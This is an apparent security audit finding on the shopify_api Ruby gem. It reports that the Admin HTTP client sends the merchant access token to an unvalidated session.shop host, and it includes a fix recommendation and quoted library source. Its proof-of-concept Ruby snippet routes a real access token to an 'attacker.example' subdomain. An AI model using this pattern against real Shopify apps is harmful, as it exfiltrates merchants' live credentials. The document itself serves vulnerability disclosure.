Found the critical issue: `HttpClient#initialize` builds the request host directly from `session.shop` with no validation against `ShopValidator`, meaning it will send the `X-Shopify-Access-Token` header to whatever hostname is stored on the `Session` object.

### Title
Host validated (`ShopValidator`) vs. host that receives the access token (`HttpClient#initialize` uses unvalidated `session.shop`) - (File: lib/shopify_api/clients/http_client.rb)

### Summary
`ShopifyAPI::Clients::HttpClient#initialize` builds the outbound request host directly from `session.shop` (`@base_uri = "https://#{api_host || session.shop}"`) with no call to `Utils::ShopValidator`, even though the gem ships a dedicated `ShopValidator.sanitize!`/`sanitize_shop_domain` module specifically to ensure a shop string is a trusted `*.myshopify.com`/`*.myshopify.io`/`spin.dev`/`shop.dev` domain before it is trusted with credentials.

### Finding Description
The identity binding that should hold is: `host that receives the X-Shopify-Access-Token == a value proven to be `*.myshopify.com` (or another entry in `TRUSTED_SHOPIFY_DOMAINS`)`.

`Utils::ShopValidator` [1](#0-0)  exists precisely to enforce this, and it is used by `Clients::Graphql::Storefront#initialize` [2](#0-1) . However, `Clients::HttpClient#initialize`, which is the base class used for all Admin REST/GraphQL requests, takes `session.shop` unchecked and uses it to build the request URI and `Host` header that will carry the merchant's access token: [3](#0-2) .

`Auth::Session#shop` itself is a plain attribute set from the constructor argument with no validation anywhere in `Session#initialize` or `Session.from` [4](#0-3) . Both the OAuth callback flow (`auth_query.shop`) and the token-exchange flow (`jwt_payload.shop`, i.e. the JWT `dest` claim) are HMAC/JWT-signature protected against tampering by an outside attacker, so in the standard OAuth/token-exchange flows the shop value is trustworthy at the point of session creation — this closes off the most direct path to exploiting the missing validation.

Because the shop value is not re-validated at the point credentials are actually sent (`HttpClient#initialize`), the binding "host receiving the token" vs "validated trusted domain" is broken by construction: it depends entirely on every code path that instantiates a `Session` doing its own sanitization before calling any Admin API client, which is not enforced by the library itself, and is inconsistent with the `Storefront` client which does enforce it.

### Impact Explanation
If any host application constructs `Auth::Session.new(shop: <value>, access_token: <token>)` from data that isn't already funneled through `ShopValidator` (e.g., a shop value taken from a request parameter, from persisted storage keyed loosely, or from a merged/looked-up record), the gem will happily send the `X-Shopify-Access-Token` header — the merchant's live Admin API credential — to whatever hostname `session.shop` evaluates to. This is a credential-exfiltration-via-SSRF-style primitive: the app's own trusted Admin token is sent to an attacker-influenced host. This matches the "High: SSRF with the app's credentials" impact bucket, since a real access token is transmitted over the wire to a host that has not been proven to be Shopify.

### Likelihood Explanation
This is a code-shape/defense-in-depth deficiency, not a demonstrated remote-exploitable path purely within the gem's own OAuth/token-exchange flows, because both of those flows do supply an HMAC- or signature-authenticated `shop`. The exposure only becomes concrete if the host application passes attacker-influenced shop strings into `Auth::Session.new` directly (a documented and common integration pattern, e.g. rehydrating a session from a webhook's `shop` header — which is not HMAC-covered, only the raw body is — see `Webhooks::Request#to_signable_string` [5](#0-4) , or from a `shop` query parameter in a non-OAuth route). Given that the gem exports `ShopValidator` as the sanctioned defense and applies it inconsistently (only in `Storefront`), and does not document that every `Session` must be pre-sanitized, likelihood is moderate rather than trivially exploitable end-to-end purely inside this gem.

### Recommendation
Call `Utils::ShopValidator.sanitize!(session.shop)` (or an equivalent check against `TRUSTED_SHOPIFY_DOMAINS`) inside `Clients::HttpClient#initialize` before using `session.shop` to build `@base_uri`/`Host`, mirroring what `Clients::Graphql::Storefront` already does. This ensures the access token is never sent to a host that hasn't been proven to be a genuine Shopify domain, regardless of how the `Session` was constructed by the host application.

### Proof of Concept
```ruby
# Any code path that builds a Session from a shop value not routed through
# ShopValidator, e.g. rehydrating from storage keyed by a webhook shop header
# (Webhooks::Request#shop is NOT HMAC-covered, only the raw body is):
attacker_shop = "legit-shop.myshopify.com.attacker.example"

session = ShopifyAPI::Auth::Session.new(
  shop: attacker_shop,
  access_token: stored_access_token_for("legit-shop.myshopify.com"),
)

client = ShopifyAPI::Clients::Rest::Admin.new(session: session)
client.get(path: "shop") 
# => HttpClient#initialize sets @base_uri = "https://legit-shop.myshopify.com.attacker.example"
# and attaches "X-Shopify-Access-Token" => stored_access_token_for(...)
# The real access token is sent to attacker.example's subdomain.
```
No call in `HttpClient#initialize` rejects `attacker_shop`, unlike `Clients::Graphql::Storefront#initialize`, which would raise `Errors::InvalidShopError` for the same input via `ShopValidator.sanitize!` [6](#0-5) .

        def initialize(shop, private_token: nil, public_token: nil, api_version: nil)
          token = private_token || public_token
          if token.nil?
            raise ArgumentError, "Storefront client requires either private_token or public_token to be provided"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          session = Auth::Session.new(
            id: validated_shop,
            shop: validated_shop,
            access_token: "",
            is_online: false,
          )

      def initialize(base_path:, session: nil)
        session ||= Context.active_session

        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)

        @headers = T.let({
          "User-Agent": "#{user_agent_prefix}Shopify API Library v#{VERSION} | Ruby #{RUBY_VERSION}",
          "Accept": "application/json",
        }, T::Hash[T.any(Symbol, String), T.untyped])

        @headers["Host"] = session.shop unless api_host.nil?

        unless session.access_token.nil? || T.must(session.access_token).empty?
          @headers["X-Shopify-Access-Token"] = T.cast(session.access_token, String)
        end
